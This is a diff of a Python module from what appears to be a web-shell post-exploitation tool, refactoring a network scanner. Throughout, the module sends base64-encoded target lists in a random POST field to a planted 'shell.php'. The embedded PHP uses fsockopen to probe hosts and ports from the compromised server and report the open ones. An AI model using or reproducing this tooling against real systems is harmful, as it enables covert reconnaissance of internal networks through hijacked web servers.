@@ -1,7 +1,6 @@
 
 from core.moduleprobeall import ModuleProbe
 from core.moduleexception import ModuleException, ProbeException
-from core.vector import VectorList, Vector
 from core.savedargparse import SavedArgumentParser as ArgumentParser
 from external.ipaddr import IPNetwork
 import re, os
@@ -15,18 +14,17 @@ WARN_INVALID_SCAN = 'Invalid scan range, check syntax'
 class Scan(ModuleProbe):
     '''Print interface addresses'''
     
-    def _init_vectors(self):
-        self.support_vectors = VectorList([
-          Vector('net.ifaces', 'ifaces', []),
-          Vector('shell.php', 'scan', ["""$str = base64_decode($_POST["$post_field"]);
+    def _set_vectors(self):
+        self.support_vectors.add_vector('ifaces', 'net.ifaces', [])
+        self.support_vectors.add_vector( 'scan', 'shell.php',["""$str = base64_decode($_POST["$post_field"]);
     foreach (explode(',', $str) as $s) {
     $s2 = explode(' ', $s);
     foreach( explode('|', $s2[1]) as $p) {
     if($fp = fsockopen("$s2[0]", $p, $n, $e, $timeout=1)) {print(" $s2[0]:$p"); fclose($fp);}
     }print(".");}""", "-post", "{\'$post_field\' : \'$data\' }"])
-        ])
     
-    def _init_args(self):
+    
+    def _set_args(self):
         self.argparser.add_argument('addr', help='Single IP, multiple: IP1,IP2,.., networks IP/MASK or firstIP-lastIP, interfaces (ethN)')
         self.argparser.add_argument('port', help='Single post, multiple: PORT1,PORT2,.. or firstPORT-lastPORT')
         self.argparser.add_argument('-unknown', help='Scan also unknown ports', action='store_true')
@@ -46,7 +44,7 @@ class Scan(ModuleProbe):
         except Exception, e:
             raise ProbeException(self.name,  '\'%s\' %s' % (services_path, WARN_NO_SUCH_FILE))
 
-        ifaces_all = self.support_vectors.get('ifaces').execute(self.modhandler)
+        ifaces_all = self.support_vectors.get('ifaces').execute()
 
         reqlist = RequestList(self.modhandler, services, ifaces_all)
         reqlist.add(self.args['addr'], self.args['port'])
@@ -72,7 +70,7 @@ class Scan(ModuleProbe):
                 reqstringarray += '%s %s,' % (host, '|'.join(portschunk))
             
             output = 'SCAN %s:%s-%s ' % (host, portschunk[0], portschunk[-1])
-            result = self.support_vectors.get('scan').execute(self.modhandler, {'post_field' : randstr(), 'data' : b64encode('%s' % reqstringarray[:-1])})
+            result = self.support_vectors.get('scan').execute({'post_field' : randstr(), 'data' : b64encode('%s' % reqstringarray[:-1])})
             if result != '.': 
                 output += 'OPEN: ' + result.strip()[:-1]
                 self._result += result.strip()[:-1]
